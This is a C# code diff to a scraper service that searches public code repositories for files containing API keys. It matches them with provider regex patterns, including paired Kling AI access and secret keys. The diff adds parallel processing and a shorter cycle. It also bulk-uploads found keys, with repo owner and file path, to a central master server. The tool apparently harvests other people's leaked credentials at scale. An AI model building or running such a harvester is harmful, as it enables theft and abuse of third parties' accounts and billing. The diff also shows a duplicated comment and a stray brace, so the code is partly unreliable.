@@ -23,6 +23,7 @@ public class ScraperService
     private readonly ILogger<ScraperService>? _logger;
     private readonly IReadOnlyList<IApiKeyProvider> _providers;
     private CancellationTokenSource? _cancellationTokenSource;
+    private readonly SemaphoreSlim _parallelSemaphore = new(8); // Limit concurrency for Render Free Tier (512MB RAM)
 
     private int _newKeysFound;
     private int _duplicateKeysFound;
@@ -161,8 +162,8 @@ public class ScraperService
                     await RunWorkerCycleAsync(_cancellationTokenSource.Token);
                     
                     // Wait before next cycle
-                    Console.WriteLine("[dim]Waiting 5 minutes before next worker sync...[/]");
-                    await Task.Delay(TimeSpan.FromMinutes(5), _cancellationTokenSource.Token);
+                    Console.WriteLine("[dim]Waiting 2 minutes before next worker sync...[/]");
+                    await Task.Delay(TimeSpan.FromMinutes(2), _cancellationTokenSource.Token);
                 }
                 catch (Exception ex)
                 {
@@ -712,21 +713,36 @@ public class ScraperService
         
         Console.WriteLine($"[dim]Fetched {resultsList.Count} matches[/]");
 
-        // Process each result
-        await AnsiConsole.Progress()
-            .StartAsync(async ctx =>
+        // Process results in parallel with a concurrency limit
+        var discoveries = new System.Collections.Concurrent.ConcurrentBag<NodeReportDto>();
+        var processingTasks = resultsList.Select(async repoRef =>
+        {
+            await _parallelSemaphore.WaitAsync(_cancellationTokenSource.Token);
+            try
             {
-                var task = ctx.AddTask($"[cyan]Processing results[/]", maxValue: resultsList.Count);
-
-                foreach (var repoRef in resultsList)
+                if (_cancellationTokenSource.Token.IsCancellationRequested) return;
+                
+                var found = await ProcessResultAndCollectAsync(repoRef, token, query, discoveredBy);
+                if (found != null && found.Any())
                 {
-                    if (_cancellationTokenSource!.Token.IsCancellationRequested)
-                        break;
-
-                    await ProcessResultAsync(repoRef, token, query, discoveredBy);
-                    task.Increment(1);
+                    foreach (var discovery in found) discoveries.Add(discovery);
                 }
-            });
+            }
+            finally
+            {
+                _parallelSemaphore.Release();
+            }
+        });
+
+        await Task.WhenAll(processingTasks);
+
+        // Bulk Report Findings (Worker Mode)
+        if (IsWorkerMode && discoveries.Any())
+        {
+            await ReportBulkDiscoveryAsync(discoveries.ToList());
+        }
+
+        // Summary
 
         // Summary
         var table = new Table()
@@ -748,14 +764,15 @@ public class ScraperService
         return resultsList.Count;
     }
 
-    private async Task ProcessResultAsync(RepoReference repoRef, SearchProviderToken token, SearchQuery query, long? discoveredBy)
+    private async Task<List<NodeReportDto>> ProcessResultAndCollectAsync(RepoReference repoRef, SearchProviderToken token, SearchQuery query, long? discoveredBy)
     {
+        var discoveredKeys = new List<NodeReportDto>();
         try
         {
             // Get file content
             var content = await FetchFileContentAsync(repoRef, token);
             if (string.IsNullOrEmpty(content))
-                return;
+                return discoveredKeys;
 
             // Search for API keys using all provider patterns
             foreach (var provider in _providers)
@@ -769,7 +786,7 @@ public class ScraperService
                     {
                         var apiKey = match.Groups.Count > 1 ? match.Groups[1].Value : match.Value;
 
-                        // Special handling for Kling AI to find Access and Secret keys together
+                        // Special handling for Kling AI
                         if (provider.ApiType == ApiTypeEnum.KlingAI && !apiKey.Contains(':'))
                         {
                             var secretMatch = System.Text.RegularExpressions.Regex.Match(content, 
@@ -782,15 +799,13 @@ public class ScraperService
                             }
                         }
 
-                        // Check if already exists
                         if (IsWorkerMode)
                         {
-                            // In worker mode, we offload "exists" check and saving to the Master
-                            await ReportDiscoveryAsync(new NodeReportDto
+                            discoveredKeys.Add(new NodeReportDto
                             {
                                  ApiKey = apiKey,
                                  ApiType = provider.ApiType,
-                                 Metadata = $"[Worker {NodeToken?.Substring(0, 5)}...]",
+                                 Metadata = $"[Worker {(!string.IsNullOrEmpty(NodeToken) && NodeToken.Length > 5 ? NodeToken.Substring(0, 5) : "Unknown")}]",
                                  RepoName = repoRef.RepoName ?? string.Empty,
                                  RepoOwner = repoRef.RepoOwner ?? string.Empty,
                                  FilePath = repoRef.FilePath ?? string.Empty,
@@ -855,9 +870,39 @@ public class ScraperService
                 }
             }
         }
+        }
         catch (Exception ex)
         {
             _logger?.LogError(ex, "Error processing result: {Url}", repoRef.FileURL);
+        }
+        return discoveredKeys;
+    }
+
+    private async Task ReportBulkDiscoveryAsync(List<NodeReportDto> discoveries)
+    {
+        if (string.IsNullOrEmpty(MasterApiUrl) || string.IsNullOrEmpty(NodeToken) || !discoveries.Any())
+            return;
+
+        try
+        {
+            using var client = _httpClientFactory.CreateClient();
+            client.DefaultRequestHeaders.Add("X-Node-Token", NodeToken);
+
+            var report = new NodeBulkReportDto { Discoveries = discoveries };
+            var response = await client.PostAsJsonAsync($"{MasterApiUrl.TrimEnd('/')}/api/v1/nodes/report", report);
+
+            if (response.IsSuccessStatusCode)
+            {
+                _logger?.LogInformation("Successfully reported {Count} keys to Master.", discoveries.Count);
+            }
+            else
+            {
+                _logger?.LogWarning("Failed to report bulk discoveries: {Status}", response.StatusCode);
+            }
+        }
+        catch (Exception ex)
+        {
+            _logger?.LogError(ex, "Exception in bulk reporting");
         }
     }
 
